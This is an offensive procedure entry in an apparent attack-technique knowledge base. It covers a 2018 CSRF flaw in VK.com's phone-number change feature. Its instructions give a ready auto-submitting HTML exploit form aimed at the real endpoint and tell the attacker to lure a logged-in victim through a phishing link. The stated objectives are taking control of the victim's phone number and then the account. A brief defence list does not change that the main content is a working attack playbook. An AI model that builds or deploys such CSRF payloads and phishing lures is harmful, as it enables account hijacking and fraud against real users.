---
tags:
  - csrf
  - exploitation
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e3e43e62-6e26-48e0-abf3-6c072ba30421
created_at: '2025-12-14T17:27:42.370Z'
updated_at: '2025-12-14T17:27:42.370Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-CSRF-to-Change-Phone-Number

## Summary

This procedure crafts and delivers a CSRF payload to VK.com's phone number change endpoint, allowing unauthorized alteration of the victim's phone using only their last name and login.

## Description

VK.com's phone change functionality in 2018 failed to validate CSRF tokens, permitting cross-site requests that mimic legitimate form submissions. An attacker hosts a malicious HTML page that auto-posts the change request when visited by the victim, redirecting control of two-factor authentication or recovery to the attacker.

## Requirements

1. Victim's last name and login
2. Control of a web server to host the malicious page
3. Victim to visit the attacker's site (e.g., via phishing)

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens with unique, session-bound values
- Monitor for anomalous phone changes and alert users
- Use same-site cookie policies and Content-Security-Policy headers

## Objectives

1. Successfully submit the CSRF request
2. Change the victim's phone to attacker's control
3. Enable follow-on account takeover

## Instructions

### Step 1: Craft Malicious HTML

**Context**: Build an auto-submitting form with victim details and desired phone.

Create an HTML file with hidden inputs for last_name, login, and new_phone, then use JavaScript to submit it immediately.

```html
<!DOCTYPE html>
<html>
<body>
<form action="https://vk.com/al_phone_change" method="POST" id="exploit">
  <input type="hidden" name="last_name" value="Doe">
  <input type="hidden" name="login" value="victim_user">
  <input type="hidden" name="new_phone" value="+1234567890">
</form>
<script>document.getElementById('exploit').submit();</script>
</body>
</html>
```

**Expected Output**: Form ready to host.

### Step 2: Host and Lure Victim

**Context**: Serve the page and trick the victim into loading it while logged into VK.com.

Upload the HTML to a web server and send a phishing link to the victim (e.g., "Check this VK update: http://attacker.com/csrf.html").

**Expected Output**: Victim's browser submits the request; VK.com processes the change.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploitation]]
